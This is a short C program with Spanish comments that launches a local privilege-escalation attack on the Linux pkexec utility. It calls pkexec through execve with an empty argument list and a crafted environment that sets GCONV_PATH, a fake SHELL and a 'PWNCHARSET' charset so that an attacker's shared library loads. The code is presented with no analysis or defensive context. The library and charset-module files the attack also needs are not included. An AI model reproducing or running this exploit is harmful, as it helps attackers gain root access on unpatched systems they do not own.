#include <unistd.h>
#include <stdio.h>
#include <stdlib.h>

int main() {
    const char *path = "/usr/bin/pkexec";
    
    // Verificar si pkexec existe y es ejecutable
    if (access(path, X_OK) == -1) {
        perror("Error: /usr/bin/pkexec no accesible");
        return EXIT_FAILURE;
    }

    // argv totalmente vacío (ni siquiera el nombre del programa)
    char *empty_argv[] = { NULL };  // Lista terminada en NULL
    char *environ[] = {"my_bad_library.so:.", "PATH=GCONV_PATH=.","SHELL=/irrele/vante", "CHARSET=PWNCHARSET", NULL};
    // Llamar a execve con argv vacío
    execve(path, empty_argv, environ);

    // Si llegamos aquí, execve falló
    perror("execve falló");
    return EXIT_FAILURE;
}
